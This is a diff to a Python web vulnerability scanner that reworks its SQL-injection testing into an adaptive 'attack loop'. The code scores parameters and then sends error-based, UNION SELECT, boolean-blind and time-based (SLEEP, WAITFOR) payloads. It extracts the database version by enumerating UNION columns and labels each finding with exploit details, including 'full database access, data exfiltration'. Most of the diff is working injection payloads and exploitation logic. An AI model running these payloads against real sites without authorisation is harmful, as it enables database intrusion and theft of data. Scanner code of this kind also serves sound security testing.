@@ -1420,236 +1420,274 @@ class VulnScanner:
                     resp = self._session.get(redirect_url, allow_wayback=False)
             return resp
 
-    def _test_endpoint_sqli(self, endpoint: dict) -> List[dict]:
-        """Test for SQL injection: error-based + blind (response-diff)."""
-        findings = []
+    # ── Parameter Scoring ─────────────────────────────────────────────────
+    def _score_param(self, profile: dict) -> int:
+        """Score a parameter to decide how deep to test it.
+        High score = more payloads, mutations, and time-based checks.
+        Low score = quick probe and move on."""
+        score = 0
+        if profile["reflected"]:
+            score += 3
+        if profile["error_sensitive"]:
+            score += 4
+        if profile["reflection_context"] in ("attribute", "script"):
+            score += 2
+        if profile["type"] == "int":
+            score += 1
+        # High-value param names
+        name = profile.get("name", "").lower()
+        if any(kw in name for kw in ("search", "query", "q", "id", "user", "name",
+                                      "page", "file", "path", "url", "cmd", "exec",
+                                      "sort", "order", "filter", "cat", "item", "title")):
+            score += 2
+        # Low-value param names
+        if any(kw in name for kw in ("utm_", "ref", "lang", "locale", "theme",
+                                      "callback", "format", "width", "height")):
+            score -= 3
+        return max(score, 0)
+
+    # ── Attack Loop Engine ─────────────────────────────────────────────────
+    def _attack_sqli(self, endpoint: dict, pname: str, pval: str,
+                     profile: dict, depth: int) -> List[dict]:
+        """Adaptive SQLi attack loop. Probes, analyzes, adapts, escalates.
+
+        depth controls how many attempts:
+          shallow (0-3): 3 quick probes
+          medium  (4-6): full error-based + blind boolean
+          deep    (7+):  + time-based + mutations + extraction
+        """
         url = endpoint["url"]
         domain = urlparse(url).netloc
         path = urlparse(url).path or "/"
-        if self._session.is_domain_blocked(domain):
+        findings = []
+
+        baseline_resp = self._send_test(endpoint, pname, pval)
+        if not baseline_resp or not baseline_resp.text:
+            return findings
+        baseline_text = baseline_resp.text[:8000]
+
+        # ── Stage 1: Quick probe (always runs) ─────────────────────────
+        # Single quote / boundary probe — detect if input reaches SQL at all
+        quote = "" if profile["type"] == "int" else "'"
+        probe = self._send_test(endpoint, pname, f"{pval}{quote}")
+        if not probe or not probe.text:
             return findings
 
-        testable = [p for p in endpoint["params"] if not p.get("hidden")]
-        if not testable:
-            testable = endpoint["params"][:2]
-
-        for param_info in testable[:4]:
-            if shutdown_requested() or self._session.is_domain_blocked(domain):
+        # Check for ANY SQL error indicator
+        sql_error_found = False
+        matched_indicator = None
+        for ind in self.SQLI_INDICATORS:
+            if ind.search(probe.text[:8000]) and not ind.search(baseline_text):
+                sql_error_found = True
+                matched_indicator = ind
                 break
-            pname = param_info["name"]
-            pval = param_info.get("value", "") or "1"
 
-            # Profile the parameter first — understand before attacking
-            profile = self._profile_param(endpoint, pname)
-            baseline_resp = self._send_test(endpoint, pname, pval)
-            baseline_text = baseline_resp.text[:8000] if baseline_resp else ""
-            baseline_len = len(baseline_resp.text) if baseline_resp else 0
+        # Also check: did the response change significantly?
+        probe_diff = self._response_diff(baseline_text, probe.text)
+        response_changed = not probe_diff["similar"]
 
-            # Skip params that look like CSRF tokens or static IDs
-            if pname.lower() in ("csrf", "token", "_token", "csrfmiddlewaretoken", "nonce"):
-                continue
+        if not sql_error_found and not response_changed and depth < 4:
+            return findings  # Shallow test: nothing interesting, move on
 
-            # Choose payloads based on profile
+        # ── Stage 2: Error-based (if error detected or medium+ depth) ──
+        if sql_error_found or depth >= 4:
             if profile["type"] == "int":
-                base_payloads = [
-                    f"{pval}-0",
-                    f"{pval} OR 1=1",
-                    f"{pval} AND 1=1",
+                payloads = [
+                    f"{pval} OR 1=1-- -", f"{pval} AND 1=2-- -",
                     f"{pval} UNION SELECT NULL-- -",
                     f"{pval} UNION SELECT NULL,NULL-- -",
                     f"{pval} UNION SELECT NULL,NULL,NULL-- -",
+                    f"{pval} UNION SELECT NULL,NULL,NULL,NULL-- -",
+                    f"{pval} UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
                     f"{pval} AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
-                    f"{pval} AND 1=CONVERT(int,@@version)-- -",
-                    f"{pval}; SELECT 1-- -",
-                    f"{pval}) OR (1=1",
                 ]
             else:
-                base_payloads = [
-                    f"{pval}'",
-                    f"{pval}\"",
-                    f"{pval}'-- -",
-                    f"{pval}\\",
-                    f"{pval}' OR '1'='1",
-                    f"{pval}') OR ('1'='1",
-                    f"{pval}' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
+                payloads = [
+                    f"{pval}' OR '1'='1'-- -", f"{pval}' AND '1'='2'-- -",
                     f"{pval}' UNION SELECT NULL-- -",
                     f"{pval}' UNION SELECT NULL,NULL-- -",
                     f"{pval}' UNION SELECT NULL,NULL,NULL-- -",
-                    f"{pval}; SELECT 1-- -",
-                    f"{pval}' AND 1=CONVERT(int,@@version)-- -",
+                    f"{pval}' UNION SELECT NULL,NULL,NULL,NULL-- -",
+                    f"{pval}' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
+                    f"{pval}' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
                 ]
 
-            # If param is error-sensitive, prioritize error-based payloads
-            # If not, add more mutation variants to bypass filters
-            error_payloads = list(base_payloads)
-            if not profile["error_sensitive"]:
-                for bp in base_payloads[4:7]:
-                    error_payloads.extend(self._mutate_sqli(bp))
+            # Add mutations if deep
+            all_payloads = list(payloads)
+            if depth >= 7:
+                for bp in payloads[:3]:
+                    all_payloads.extend(self._mutate_sqli(bp))
 
-            for payload in error_payloads:
+            for payload in all_payloads:
                 if shutdown_requested() or self._session.is_domain_blocked(domain):
                     break
                 resp = self._send_test(endpoint, pname, payload)
                 if not resp or not resp.text:
                     continue
 
-                for indicator in self.SQLI_INDICATORS:
-                    if indicator.search(resp.text[:8000]):
-                        if not (baseline_text and indicator.search(baseline_text)):
-                            test_url = f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url
+                for ind in self.SQLI_INDICATORS:
+                    if ind.search(resp.text[:8000]) and not ind.search(baseline_text):
+                        # Confirmed error-based SQLi — try to extract data
+                        extracted = self._sqli_extract(endpoint, pname, pval, profile)
+                        test_url = f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url
+                        detail = f"SQL error from: {payload[:40]}"
+                        if extracted:
+                            detail += f". VERIFIED: {extracted}"
 
-                            # Verification: try to extract actual data to prove impact
-                            extracted_info = ""
-                            verify_payloads = []
-                            if profile["type"] == "int":
-                                verify_payloads = [
-                                    f"{pval} UNION SELECT CONCAT(0x67733a,version(),0x3a7367),NULL-- -",
-                                    f"{pval} UNION SELECT CONCAT(0x67733a,version(),0x3a7367),NULL,NULL-- -",
-                                    f"{pval} UNION SELECT NULL,CONCAT(0x67733a,version(),0x3a7367)-- -",
-                                    f"{pval} UNION SELECT NULL,CONCAT(0x67733a,version(),0x3a7367),NULL-- -",
-                                ]
-                            else:
-                                verify_payloads = [
-                                    f"{pval}' UNION SELECT CONCAT(0x67733a,version(),0x3a7367),NULL-- -",
-                                    f"{pval}' UNION SELECT CONCAT(0x67733a,version(),0x3a7367),NULL,NULL-- -",
-                                    f"{pval}' UNION SELECT NULL,CONCAT(0x67733a,version(),0x3a7367)-- -",
-                                    f"{pval}' UNION SELECT NULL,CONCAT(0x67733a,version(),0x3a7367),NULL-- -",
-                                ]
-
-                            for vp in verify_payloads:
-                                v_resp = self._send_test(endpoint, pname, vp)
-                                if v_resp and v_resp.text:
-                                    # Look for our marker gs:DATA:sg
-                                    vm = re.search(r"gs:(.*?):sg", v_resp.text)
-                                    if vm:
-                                        extracted_info = f"DB version: {vm.group(1)}"
-                                        break
-
-                            detail = (f"SQL error triggered by: {payload[:40]}. "
-                                      "Input reaches SQL query without sanitization.")
-                            if extracted_info:
-                                detail += f" VERIFIED: {extracted_info}"
-
-                            findings.append({
-                                "severity": SEV_CRITICAL,
-                                "title": f"SQL injection via '{pname}' at {path}",
-                                "detail": detail,
-                                "evidence": f"param: {pname}, payload: {payload[:40]}, "
-                                            f"matched: {indicator.pattern[:50]}"
-                                            + (f", {extracted_info}" if extracted_info else ""),
-                                "exploitable": True,
-                                "test_url": test_url,
-                                "exploit_info": {
-                                    "type": "sqli",
-                                    "parameter": pname,
-                                    "path": path,
-                                    "method": f"Inject via '{pname}' at {path}. Error-based confirmed."
-                                              + (f" {extracted_info}" if extracted_info else ""),
-                                    "risk": "Full database access, data exfiltration, potential RCE",
-                                },
-                            })
-                            return findings
-
-            # === Phase B: Blind boolean-based detection (with structural diff) ===
-            if baseline_resp and baseline_resp.text:
-                true_resp = self._send_test(endpoint, pname, f"{pval}' AND '1'='1")
-                false_resp = self._send_test(endpoint, pname, f"{pval}' AND '1'='2")
-                if true_resp and false_resp and true_resp.text and false_resp.text:
-                    true_diff = self._response_diff(baseline_resp.text, true_resp.text)
-                    false_diff = self._response_diff(baseline_resp.text, false_resp.text)
-
-                    # True condition should be similar to baseline,
-                    # false condition should differ meaningfully
-                    if true_diff["similar"] and not false_diff["similar"]:
-                        test_url = f"{url}?{pname}={quote(pval)}' AND '1'='1" if endpoint["method"] == "GET" else url
                         findings.append({
                             "severity": SEV_CRITICAL,
-                            "title": f"Blind SQL injection via '{pname}' at {path}",
-                            "detail": f"Response differs based on boolean SQL condition. "
-                                      f"AND 1=1 similarity={true_diff['score']}, "
-                                      f"AND 1=2 similarity={false_diff['score']}.",
-                            "evidence": f"param: {pname}, true_sim={true_diff['score']}, "
-                                        f"false_sim={false_diff['score']}",
+                            "title": f"SQL injection via '{pname}' at {path}",
+                            "detail": detail,
+                            "evidence": f"param: {pname}, payload: {payload[:40]}, "
+                                        f"indicator: {ind.pattern[:40]}"
+                                        + (f", {extracted}" if extracted else ""),
                             "exploitable": True,
                             "test_url": test_url,
                             "exploit_info": {
-                                "type": "sqli",
-                                "parameter": pname,
-                                "path": path,
-                                "method": f"Blind boolean SQLi via '{pname}'. "
-                                          "Extract data: ' AND SUBSTRING(user(),1,1)='a' --",
-                                "risk": "Full database access via blind extraction",
+                                "type": "sqli", "parameter": pname, "path": path,
+                                "method": f"Error-based SQLi at {path} via '{pname}'."
+                                          + (f" {extracted}" if extracted else ""),
+                                "risk": "Full database access, data exfiltration, potential RCE",
                             },
                         })
                         return findings
 
-            # === Phase C: Time-based blind detection (adaptive timing) ===
-            if not findings and baseline_resp:
-                # Build time payloads based on parameter type
-                if profile["type"] == "int":
-                    time_payloads = [
-                        (f"{pval} AND SLEEP(3)-- -", "MySQL SLEEP (int)"),
-                        (f"{pval} AND (SELECT SLEEP(3))-- -", "MySQL subquery SLEEP"),
-                        (f"{pval}; SELECT pg_sleep(3)-- -", "PostgreSQL pg_sleep"),
-                        (f"{pval}; WAITFOR DELAY '0:0:3'-- -", "MSSQL WAITFOR"),
-                        (f"{pval} AND BENCHMARK(3000000,SHA1('x'))-- -", "MySQL BENCHMARK"),
-                    ]
-                else:
-                    time_payloads = [
-                        (f"{pval}' AND SLEEP(3)-- -", "MySQL SLEEP (string)"),
-                        (f"{pval}' AND (SELECT SLEEP(3))-- -", "MySQL subquery SLEEP"),
-                        (f"{pval}'; SELECT pg_sleep(3)-- -", "PostgreSQL pg_sleep"),
-                        (f"{pval}'; WAITFOR DELAY '0:0:3'-- -", "MSSQL WAITFOR"),
-                        (f"{pval}' OR SLEEP(3)-- -", "MySQL OR SLEEP"),
-                    ]
+        # ── Stage 3: Blind boolean (if response changed or medium+ depth) ──
+        if (response_changed or depth >= 4) and not findings:
+            if profile["type"] == "int":
+                true_val, false_val = f"{pval} AND 1=1", f"{pval} AND 1=2"
+            else:
+                true_val = f"{pval}' AND '1'='1"
+                false_val = f"{pval}' AND '1'='2"
 
-                # Adaptive baseline: take 2 samples to measure variance
-                times = []
-                for _ in range(2):
+            true_resp = self._send_test(endpoint, pname, true_val)
+            false_resp = self._send_test(endpoint, pname, false_val)
+            if true_resp and false_resp and true_resp.text and false_resp.text:
+                true_diff = self._response_diff(baseline_text, true_resp.text)
+                false_diff = self._response_diff(baseline_text, false_resp.text)
+
+                if true_diff["similar"] and not false_diff["similar"]:
+                    test_url = f"{url}?{pname}={quote(true_val)}" if endpoint["method"] == "GET" else url
+                    findings.append({
+                        "severity": SEV_CRITICAL,
+                        "title": f"Blind SQLi via '{pname}' at {path}",
+                        "detail": f"Boolean condition changes response. "
+                                  f"true_sim={true_diff['score']}, false_sim={false_diff['score']}",
+                        "evidence": f"param: {pname}, "
+                                    f"true={true_diff['score']}, false={false_diff['score']}",
+                        "exploitable": True, "test_url": test_url,
+                        "exploit_info": {
+                            "type": "sqli", "parameter": pname, "path": path,
+                            "method": f"Blind boolean SQLi via '{pname}'.",
+                            "risk": "Database extraction via boolean inference",
+                        },
+                    })
+                    return findings
+
+        # ── Stage 4: Time-based blind (deep only) ──────────────────────
+        if depth >= 7 and not findings:
+            times = []
+            for _ in range(2):
+                t0 = time.time()
+                self._send_test(endpoint, pname, pval)
+                times.append(time.time() - t0)
+            bt = sum(times) / len(times)
+            bv = max(abs(t - bt) for t in times)
+            threshold = bt + max(2.0, bv * 3)
+
+            if profile["type"] == "int":
+                tp = [(f"{pval} AND SLEEP(3)-- -", "SLEEP"),
+                      (f"{pval} AND (SELECT SLEEP(3))-- -", "subquery SLEEP"),
+                      (f"{pval}; WAITFOR DELAY '0:0:3'-- -", "WAITFOR")]
+            else:
+                tp = [(f"{pval}' AND SLEEP(3)-- -", "SLEEP"),
+                      (f"{pval}' AND (SELECT SLEEP(3))-- -", "subquery SLEEP"),
+                      (f"{pval}'; WAITFOR DELAY '0:0:3'-- -", "WAITFOR")]
+
+            for payload, desc in tp:
+                if shutdown_requested() or self._session.is_domain_blocked(domain):
+                    break
+                t0 = time.time()
+                self._send_test(endpoint, pname, payload)
+                e1 = time.time() - t0
+                if e1 > threshold and e1 > bt + 2.0:
                     t0 = time.time()
-                    _ = self._send_test(endpoint, pname, pval)
-                    times.append(time.time() - t0)
-                baseline_time = sum(times) / len(times)
-                baseline_variance = max(abs(t - baseline_time) for t in times)
-                # Threshold: baseline + max(2s, 2x variance)
-                threshold = baseline_time + max(2.0, baseline_variance * 3)
+                    self._send_test(endpoint, pname, payload)
+                    e2 = time.time() - t0
+                    if e2 > threshold and e2 > bt + 2.0:
+                        test_url = f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url
+                        findings.append({
+                            "severity": SEV_CRITICAL,
+                            "title": f"Time-based blind SQLi via '{pname}' at {path}",
+                            "detail": f"{desc}: baseline={bt:.1f}s, test={e1:.1f}s/{e2:.1f}s",
+                            "evidence": f"param: {pname}, {desc}, {e1:.1f}s/{e2:.1f}s vs {bt:.1f}s",
+                            "exploitable": True, "test_url": test_url,
+                            "exploit_info": {
+                                "type": "sqli", "parameter": pname, "path": path,
+                                "method": f"Time-based blind SQLi via {desc}.",
+                                "risk": "Database extraction via time-based inference",
+                            },
+                        })
+                        return findings
 
-                for payload, desc in time_payloads:
-                    if shutdown_requested() or self._session.is_domain_blocked(domain):
-                        break
-                    t0 = time.time()
-                    resp = self._send_test(endpoint, pname, payload)
-                    elapsed = time.time() - t0
+        return findings
 
-                    if elapsed > threshold and elapsed > baseline_time + 2.0:
-                        # Confirm with second measurement
-                        t0 = time.time()
-                        resp2 = self._send_test(endpoint, pname, payload)
-                        elapsed2 = time.time() - t0
+    def _sqli_extract(self, endpoint: dict, pname: str, pval: str,
+                      profile: dict) -> str:
+        """Try to extract DB version via UNION SELECT after confirming SQLi."""
+        q = "" if profile["type"] == "int" else "'"
+        for cols in range(1, 8):
+            nulls = ",".join(["NULL"] * cols)
+            for pos in range(cols):
+                parts = ["NULL"] * cols
+                parts[pos] = "CONCAT(0x67733a,version(),0x3a7367)"
+                union = ",".join(parts)
+                payload = f"{pval}{q} UNION SELECT {union}-- -"
+                resp = self._send_test(endpoint, pname, payload)
+                if resp and resp.text:
+                    m = re.search(r"gs:(.*?):sg", resp.text)
+                    if m:
+                        return f"DB version: {m.group(1)}"
+        return ""
 
-                        if elapsed2 > threshold and elapsed2 > baseline_time + 2.0:
-                            test_url = f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url
-                            findings.append({
-                                "severity": SEV_CRITICAL,
-                                "title": f"Time-based blind SQLi via '{pname}' at {path}",
-                                "detail": f"Response delayed by {desc}. "
-                                          f"Baseline: {baseline_time:.1f}s, "
-                                          f"payload: {elapsed:.1f}s, confirm: {elapsed2:.1f}s.",
-                                "evidence": f"param: {pname}, {desc}, "
-                                            f"delay: {elapsed:.1f}s / {elapsed2:.1f}s vs baseline {baseline_time:.1f}s",
-                                "exploitable": True,
-                                "test_url": test_url,
-                                "exploit_info": {
-                                    "type": "sqli",
-                                    "parameter": pname,
-                                    "path": path,
-                                    "method": f"Time-based blind SQLi via '{pname}'. "
-                                              f"Confirmed with {desc}. "
-                                              "Extract data: ' AND IF(SUBSTRING(user(),1,1)='a',SLEEP(5),0)-- -",
-                                    "risk": "Full database access via time-based extraction",
-                                },
-                            })
-                            return findings
+    def _test_endpoint_sqli(self, endpoint: dict) -> List[dict]:
+        """Test endpoint for SQLi using the adaptive attack loop."""
+        url = endpoint["url"]
+        domain = urlparse(url).netloc
+        if self._session.is_domain_blocked(domain):
+            return []
+
+        testable = [p for p in endpoint["params"] if not p.get("hidden")]
+        if not testable:
+            testable = endpoint["params"][:2]
+
+        skip_names = {"csrf", "token", "_token", "csrfmiddlewaretoken", "nonce",
+                      "__requestverificationtoken", "csrf_token", "authenticity_token"}
+        findings = []
+
+        for param_info in testable[:4]:
+            if shutdown_requested() or self._session.is_domain_blocked(domain):
+                break
+            pname = param_info["name"]
+            if pname.lower() in skip_names:
+                continue
+            pval = param_info.get("value", "") or "1"
+
+            profile = self._profile_param(endpoint, pname)
+            score = self._score_param(profile)
+
+            # Depth determines how many techniques to try
+            if score >= 7:
+                depth = 10   # deep: all techniques + mutations + time-based
+            elif score >= 4:
+                depth = 6    # medium: error-based + blind boolean
+            else:
+                depth = 2    # shallow: quick probe only
+
+            result = self._attack_sqli(endpoint, pname, pval, profile, depth)
+            if result:
+                findings.extend(result)
+                return findings
 
         return findings
 
